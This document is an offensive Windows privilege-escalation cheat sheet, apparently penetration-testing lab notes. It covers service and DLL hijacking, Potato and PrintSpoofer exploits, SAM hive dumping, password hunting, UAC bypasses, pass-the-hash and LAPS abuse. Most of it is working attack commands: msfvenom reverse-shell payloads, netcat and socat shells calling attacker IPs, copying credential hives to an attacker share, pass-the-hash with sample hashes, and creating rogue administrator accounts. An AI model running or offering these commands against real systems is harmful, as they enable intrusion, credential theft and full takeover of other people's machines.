- [ ] While Checking for permissions check if both file and directory are writable. If any one is lesgoo...!
## Service Binary Hijacking
```
Get-CimInstance -ClassName win32_service | SelectName,State,PathName | Where-Object{$_.State-like'Running'}

icacls "C:\xampp\apache\bin\httpd.exe" (Check for write permissions)

**or**
  
Transfer Powerup.ps1
    
../Powerup.ps1
    
Get-ModifiableServiceFile (Automation to check which service binary can be replaced)
    
Get-CimInstance -ClassName win32_service | SelectName,StartMode | Where-Object{$_.Name-like'BackupMonitor'}(Check whether the service restarts itself or we have to)
    
**create shell.exe,filetransfer,rename it as original service filename**

net stop servicename

net start servicename
    
**or**

whoami /priv (look for shutdown privilege disabled)
   
shutdown /r /t 0
```
    
Note: When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

## DLL Hijacking
- [ ] Check Service Binary Hijacking
- [ ] If we didn’t have write permission ,open procmon and filter based on specific service name.exe and create File in operations
- [ ] Look for the service calling a dll.
- [ ] Check if you have write permission there of if there is no dll replace it with shell.dll (look in Small exploits)
or
```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f dll > shell.dll

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f dll > shell.dll
```
File transfer and done

## Insecure Service File Permissions
```
sc queryex type=service (to check state of service)  

Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object{$_.State -like 'Running'} 

icacls "filepath" (to check if it is writable)  

Compile adduser.c and file transfer add user.exe to shell 
Replace service file with adduser.exe using copy command.  
Restart the service 
or 
restart the server - net stop servicename 
**or**
net restart servicename 
**or**
shutdown /r /t 0  
Get shell again and run net localgroup Administrators we can see our user evil there
```
Note : Start-Service servicename
## Insecure Service Permissions
For Safety move original service file as .bak and replace our revshell.exe as that service file.
```
wmic service get name,startname,pathname (enumerating services, Look for services inside ProgramFiles)

sc qc "servicename"(Check for Local System and start type for DEMAND START)

accesschk.exe /accepteula -uwcqv user servicename (using accesschk to identify SERVICE ALL ACCESS or SERVICE CHANGE CONFIG permissions)

msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f exe > shell.exe

FileTransfer
sc config servicename binPath="C:\Users\Public\shell.exe"
nc -lvnp port
net start servicename
```

## Weak Registry Permissions
Look for reg path in winpeas result
```
sc qc "servicename"  

accesschk.exe /accepteula -uvwqk "regpath" (use -d if it gives no o/p)  

Is it writable for NT Authority/ Interactive?  
reg add 'regpath' /v ImagePath /t REG_EXPAND_SZ /d pathofreverse.exe /f

listener on kali
net start servicename
```
**Note** : sc config servicename start= auto

## UNQUOTED SERVICE PATHS
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

wmic service get name,startname,pathname (display service names and its path)

sc qc unquotedsvc (querying the service to check)  

accesschk.exe /accepteula -uwdq "C:\ProgramFiles\UnquotedPathService\"(Checking Write Access) 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=kaliip LPORT=port -f exe -o reverse.exe  

move servicefile.exe servicefile.bak  

File Transfer (Place the file based on unquoted service path exploit)  

Start listener  
net start servicename
```

## Task Scheduler 
```
Get-ScheduledTask 
or
schtasks /query /fo LIST /V (identify at ask that works once a minute)  

accesschk.exe /accepteula -quvw user C:\DevTools\service.exe  

echo C:\PrivEsc\reverse.exe >> C:\DevTools\service.exe (we are just adding the path of our reverse shell executable) 

Startlistener

In Some cases,  
create a schedule task (cfexec.cfm) in C:\inetpub\wwwroot\cfexec.cfm and check save output

or reverse shell  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp

PS1 File?

$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force  

$mycreds = New-Object System.Management.Automation.PSCredential("alice",$secpasswd)  

$computer="Bethany"  

[System.Diagnostics.Process]::Start("C:\Users\Public\rev.exe","",$mycreds.Username,$mycreds.Password,$computer) 

msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > rev.exe  

powershell -ExecutionPolicy Bypass -File c:\users\public\root.ps1
```

## SEImpersonation
(Potato Exploits / PrintSpoofer) (this may fail troubleshoot by trying more than 3 - 5 times and check juggernaut blog and then conclude any decision)
Mostly works when you are service user  
```
whoami/priv  
```
SeImpersonate Privileges Enabled?  
If not np we can simulate as service account  
```
PSExec64.exe -i -u "ntauthority\localservice" C:\PrivEsc\reverse.exe
```
Check OS Version
```
>= Win 10 1809 & Windows Server 2019 - ROGUEPOTATO < Win 10 1809 < Windows server 2019 - JUICYPOTATO  
> Win 10 1607 & Server 2016 - 2019 present
```
#### Juicy Potato
- Start listener for reverse.exe
```
JuicyPotato.exe -t * -p reverse.exe -l 443
```
#### God Potato
```
.\godpotato.exe -cmd "C:\Windows\Temp\nc64.exe 192.168.45.197 4433 -e cmd"
```
another
```
godpotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.182 445"
```
#### PrintSpoofer 
```
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```
#### Rogue Potato
```
sudo socat tcp-listen:135,reuseaddr,forktcp:10.10.146.246:9999 
```
(we are opening a port in kali accepting connections and forwarding it to 9999)
    
start netcat listener with reverse.exe port
```
C:\PrivEsc\RoguePotato.exe -r 10.8.66.109 -e "C:\PrivEsc\reverse.exe" -l 9999
```
#### Token Impersonation
```
sc query spooler  
PrintSpoofer.exe -i -c cmd
or  
PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```
## SEBackup Privileges Present
```
whoami /priv  
SeBackupPrivilege disabled? Enable it  
File Transfer those two dll  
Import-Module .\SeBackupPrivilegeUtils.dll  
Import-Module .\SeBackupPrivilegeCmdLets.dll  
Set-SeBackupPrivilege  
Get-SeBackupPrivilege  
cd c:\  
mkdir Temp  
reg save hklm\sam c:\Temp\sam  
reg save hklm\system c:\Temp\system  
File transfer them to kali  
pypykatz registry --sam sam system  

Passthehash using evil-winrm

evil-winrm -i ip -u user -H "hash"
```
Reference : https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

## Password Hunt 
```
lazagne.exe -all  
findstr /si password *.txt*.ini*.config (try searching in different directories)  

dir /s *pass* == *cred* == *vnc* == *.config*  

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

where /R C:\user.txt  
where /R C:\*.ini  
reg query HKLM /f password /t REG_SZ /s  
reg query reg path
evil-winrm -u user -p pass -i ip
```

## STORED CREDENTIALS:

```
cmdkey /list
    
start listener
    
runas /savecred /user:admin C:\PrivEsc\reverse.exe (we get system shell here)
    
C:\Windows\System32\runas.exe /env /noprofile /user:<username><password>"c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e
cmd.exe"
```
    
## ALWAYS INSTALL ELEVATED
Look in Winpeas whether it is set to 1(0x1) for both HKLM, HKCU.

reg query pathname - to query the registry to check whether win installer has elevated priv if 0x1 then its enabled

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

FileTransfer
    
Listener on kali
    
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
    
## AUTORUNS 
(Admin must login for this to work)
    
Look for WinPeas results  

```
reg query "regpath"  

accesschk.exe /accepteula -wvu servicepath (checking whether we can place our revshell.exe there) 
```

start listener before placing file  

Since its autorun we get shell after restarting server and admin login

## KERNEL EXPLOITS:
```
systeminfo | findstr /B /C:"OSName" /C:"OSVersion" /C:"SystemType"  
driveryquery /v (even if driver is stopped we can interact with it since its loaded in kernel memory space) 
```
searchsploit "3rd party drivername"  
For more info on version look for that drivername in ProgramFiles\  
require gcc.exe
filetransfer
Run whoami before running exploit 
https://www.exploit-db.com/exploits/40564 - afd.sys LPE

## Pass The Hash
```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd 
evil-winrm -u user -H hash -i ip
```

## CLSID Extraction
```
Get-ChildItem -Path HKLM:\SOFTWARE\Classes\CLSID | ForEach-Object { if ((Get-ItemProperty $_.pspath).'(default)' - match "AppID") { Write-Host $_.pschildname } }
```
## Try to Change password pf administrator
```
net user "user" "pass"
```
## Changes to System Shell
```
powershell.exe Start-Process cmd.exe -Verb runAs
```
## SAM & System Files
```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\  
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\  
python3 creddump7/pwdump.py SYSTEM SAM  
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```
Try Pass-The-Hash Attack.

## UAC Bypass
Try checking the integrity level  
```
whoami /groups (see last one)  
net user admin Ev!lpass (Access Denied?)(We are changing password of user admin) 
powershell.exe Start-Process cmd.exe -Verb runAs (We'll get UAC prompt)  
```
https://www.exploit-db.com/exploits/46998  
use exploit/windows/local/bypassuac_eventvwr

## Bypass 
Check for fodhelper.exe or any other binary that runs on high integrity - 
```
C:\Windows\System32\fodhelper.exe 
```
**Look for Application Manifest**
- sigcheck.exe -a -m "binary path"  
- Is AUTOELEVATE set to TRUE?(helps app to run on high integrity without UAC prompt)  
- requestedExecutionLevel level="requireAdministrator"?(only admin users are meant to run this)
Use PROCMON,
Filter > Process Name > binary name 
Filter > Operation > Reg  
Filter > Result > Not Found  
Is these there? then,  
Filter > Path > HKCU  
Find the path then -
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

whoami/groups
```

## For Sch Tasks
```
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM "/f

schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```
## AUTOMATION
```
https://github.com/hfiref0x/UACME 
C:\tools\UACME-Akagi64.exe 33
```

33  fodhelper.exe

34  DiskCleanup scheduled task

70 fodhelper.exe using CurVer registry key

## USER IN LAPS GROUP? (Check Timelapse machine from ippsec)

```
crackmapexec ldap 192.168.1.172 -u administrator -p ‘Ignite@123’ –kdcHost 192.168.1.172 -M laps
```
## MISC:
```
system('net user pwn pass123 /add');  
system('net localgroup Administrators pwn /add');  
psexec.py Administrator@10.3.3.14 -hashes :81705f25df71d547b2f658fbfd11885d
```
